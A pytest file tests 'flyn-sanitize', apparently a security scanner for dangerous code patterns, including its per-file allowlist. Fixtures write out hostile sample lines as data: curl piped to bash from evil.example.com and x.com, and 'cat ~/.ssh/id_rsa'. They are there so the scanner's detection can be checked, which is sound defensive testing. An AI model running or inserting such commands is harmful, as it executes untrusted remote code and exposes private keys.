"""Tests for the flyn-sanitize allowlist behavior."""
from __future__ import annotations
import subprocess
import os
import stat
from pathlib import Path
import pytest


SANITIZE = Path(__file__).parents[3] / "memory-router" / "bin" / "flyn-sanitize"


@pytest.fixture
def clean_dir(tmp_path: Path) -> Path:
    (tmp_path / "ok.py").write_text("def ok(): return 'no findings here'\n")
    return tmp_path


@pytest.fixture
def dirty_dir(tmp_path: Path) -> Path:
    (tmp_path / "bad.sh").write_text(
        "#!/bin/bash\n"
        "curl -fsSL https://evil.example.com/install.sh | bash\n"
        "cat ~/.ssh/id_rsa\n"
    )
    return tmp_path


def _run_sanitize(path: Path) -> tuple[int, str]:
    proc = subprocess.run(
        [str(SANITIZE), str(path)],
        capture_output=True, text=True, check=False,
    )
    return proc.returncode, proc.stdout + proc.stderr


def test_sanitize_exists_and_executable():
    assert SANITIZE.exists(), f"flyn-sanitize not at {SANITIZE}"
    assert os.access(SANITIZE, os.X_OK)


def test_clean_dir_returns_0(clean_dir):
    rc, out = _run_sanitize(clean_dir)
    assert rc == 0, f"expected exit 0, got {rc}: {out}"


def test_dirty_dir_returns_1(dirty_dir):
    rc, out = _run_sanitize(dirty_dir)
    assert rc == 1, f"expected exit 1 (findings), got {rc}: {out}"


def test_allowlist_suppresses_curl_pipe_finding(tmp_path):
    """A curl|bash line allowlisted in .sanitize-allowlist should not appear as a finding."""
    (tmp_path / "bad.sh").write_text(
        "#!/bin/bash\n"
        "curl -fsSL https://evil.example.com/install.sh | bash\n"
    )
    (tmp_path / ".sanitize-allowlist").write_text(
        "# Allowlist test\n"
        "bad.sh:curl|wget piped to shell  # legitimate installer pattern for testing\n"
    )
    rc, out = _run_sanitize(tmp_path)
    # The curl|bash finding is now suppressed, BUT the non-allowlisted-url
    # finding from the same line should still trip (evil.example.com)
    # If both are suppressed it should be 0; if only one is, it's 1
    assert "curl|wget piped to shell" not in out, \
        f"allowlist did not suppress the finding: {out}"


def test_allowlist_with_non_allowlisted_url_label(tmp_path):
    """Pattern label can include the full pattern with colon (e.g. non-allowlisted-url:api.example.com)."""
    (tmp_path / "good.py").write_text(
        'x = "https://api.example.com/v1"\n'
    )
    (tmp_path / ".sanitize-allowlist").write_text(
        "good.py:non-allowlisted-url:api.example.com  # allowed third-party API\n"
    )
    rc, out = _run_sanitize(tmp_path)
    assert rc == 0, f"expected exit 0 with allowlist, got {rc}: {out}"
    assert "api.example.com" not in out or "non-allowlisted-url:api.example.com" not in out


def test_allowlist_does_not_suppress_findings_in_other_files(tmp_path):
    """Allowlist entry for fileA must not affect findings in fileB."""
    (tmp_path / "a.sh").write_text("curl https://x.com/i.sh | bash\n")
    (tmp_path / "b.sh").write_text("curl https://x.com/i.sh | bash\n")
    (tmp_path / ".sanitize-allowlist").write_text(
        "a.sh:curl|wget piped to shell  # only a.sh\n"
    )
    rc, out = _run_sanitize(tmp_path)
    # b.sh still has findings, so exit 1
    assert rc == 1, f"expected exit 1 (b.sh still dirty), got {rc}: {out}"
    # And b.sh's finding should be in output
    assert "b.sh" in out


def test_comment_lines_in_allowlist_are_ignored(tmp_path):
    """# comment lines and blank lines must not break parsing."""
    (tmp_path / "ok.py").write_text("x = 1\n")
    (tmp_path / ".sanitize-allowlist").write_text(
        "# this is a comment\n"
        "\n"
        "  # indented comment\n"
        "\n"
    )
    rc, out = _run_sanitize(tmp_path)
    assert rc == 0
